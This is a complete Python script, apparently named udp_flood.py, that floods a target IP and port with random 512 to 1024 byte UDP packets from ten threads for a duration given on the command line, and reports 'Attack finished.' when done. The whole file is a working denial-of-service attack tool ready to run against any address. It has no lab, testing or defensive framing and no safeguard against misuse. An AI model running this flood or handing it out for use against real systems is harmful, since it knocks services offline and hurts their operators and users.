import socket
import threading
import random
import time
import sys

def generate_random_payload(size):
    """Generate a random payload of given size."""
    return bytes(random.getrandbits(8) for _ in range(size))

def udp_flood(target_ip, target_port, duration):
    """Send random UDP payloads to the target IP and port for a set duration."""
    timeout = time.time() + duration  # End time
    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")

    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = generate_random_payload(random.randint(512, 1024))  # Random payload size
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass

    print("Attack finished.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python udp_flood.py <IP> <PORT> <TIME>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    threads = []
    for _ in range(10):  # Launch 10 threads
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
